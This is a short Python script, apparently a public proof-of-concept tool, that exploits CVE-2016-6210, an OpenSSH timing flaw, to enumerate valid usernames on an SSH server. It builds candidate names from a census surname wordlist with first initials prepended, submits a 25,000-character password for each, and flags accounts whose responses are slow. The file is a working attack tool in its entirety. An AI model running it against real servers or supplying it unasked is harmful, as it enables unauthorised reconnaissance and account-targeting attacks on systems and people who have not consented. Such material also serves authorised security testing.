#!/usr/bin/python
#
# enumer8-ssh.py
# Eric Conrad
# Twitter: @eric_conrad
# Github: https://github.com/eric-conrad/enumer8
#
# Reads a list of potential usernames and tests an openssh server
# for the CVE-2016-6210 opensshd timing attack bug
# Loops while prepending first initials to each name if guessinitial=1
# 
# Based on Eddie Harari's opensshd user enumeration POC
# http://seclists.org/fulldisclosure/2016/Jul/51
#
# Output is account: seconds
# 
# Valid users typically take over 20 seconds to respond, depending on system
# speed and network congestion
# 
# Sample output vs. an Ubuntu 16.04 system (2ghz CPU, 8 gigs RAM), user
# econrad is valid:
#
# jsnow: 2.3
# dtargaryen: 2.66
# econrad: 20.17
# tlannister: 2.17

import sys
import os
import paramiko
import time
import string

file='wordlists/US-census2000-lastnames-top-100.txt'
host='example.com'
password='A'*25000
port=22

# Set to 1 to prepend a first initial
guessinitial=1

# Most popular first name initials in order, per the 1990 US census:
# initials="jmrdcaslbetkgpwhnfvioyzqux"
#
# First initials to guess, omits z, q, u and x. Season to taste
initials="jmrdcaslbetkgpwhnfvioy"

def sshconnect(host, user, port, password):
  sys.stdout.write(user+": ")
  sys.stdout.flush()
  starttime=time.time()
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    ssh.connect(host, username=user, port=port, password=password)
  except:
    #print round(time.time()-starttime,2), user
    print round(time.time()-starttime,2)

if (not os.path.isfile(file)):
  print "File does not exist:", file
  sys.exit(1)
infile = open(file, 'r')
for line in infile:
  user=line.strip()
  if (guessinitial==1):
    for init in initials:
      sshconnect(host, init+user, port, password)
  else:
    sshconnect(host, user, port, password)
